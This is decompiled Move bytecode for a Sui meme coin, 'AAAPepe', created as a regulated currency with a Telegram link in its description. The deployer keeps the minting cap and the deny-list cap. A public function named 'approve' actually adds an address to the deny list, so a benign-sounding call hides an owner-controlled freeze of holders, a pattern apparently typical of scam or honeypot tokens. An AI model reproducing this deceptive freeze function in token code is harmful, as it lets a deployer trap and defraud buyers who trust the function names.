module 0x4dfc4c887016f982dcced8ba3c0f748d0b6c22caa1c239caac10c7f2a30a7b90::aaapepe {
    struct AAAPEPE has drop {
        dummy_field: bool,
    }

    public entry fun add_to_denylist(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AAAPEPE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<AAAPEPE>(arg0, arg1, arg2, arg3);
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AAAPEPE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        add_to_denylist(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: AAAPEPE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<AAAPEPE>(arg0, 2, b"AAAPepe", b"AAAPepe", b"AAAPepeee IS THE PEPE BUT ON SUI https://t.me/aaapepeglobal", 0x1::option::none<0x2::url::Url>(), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AAAPEPE>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<AAAPEPE>(&mut v3, 100000000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<AAAPEPE>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<AAAPEPE>>(v1, v4);
    }

    public entry fun remove_from_denylist(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AAAPEPE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<AAAPEPE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

